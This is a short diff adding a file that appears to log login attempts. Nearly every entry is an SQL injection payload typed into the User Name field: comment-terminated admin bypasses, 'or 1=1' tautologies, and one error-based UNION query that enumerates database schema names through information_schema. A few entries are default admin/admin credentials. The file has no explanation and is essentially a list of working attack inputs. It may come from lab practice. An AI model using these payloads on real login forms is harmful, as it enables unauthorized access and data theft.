@@ -1,0 +1,30 @@
+User Name:admin
+Password:admin
+User Name:'admin'
+Password:'admin'
+User Name:admin" -- #
+Password:
+User Name:admin" -- #
+Password:
+User Name:" or 1=1 -- #
+Password:
+User Name:admin' -- #
+Password:
+User Name:admin" -- #
+Password:
+User Name:'admin'
+Password:'admin'
+User Name:1") union Select count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a; -- #
+Password:
+User Name:") or 1=1 -- #
+Password:
+User Name:admin" -- #
+Password:
+User Name:admin' -- #
+Password:
+User Name:" or 1=1 -- #
+Password:
+User Name:") or 1=1 -- #
+Password:
+User Name:") or 1=1 -- #
+Password:
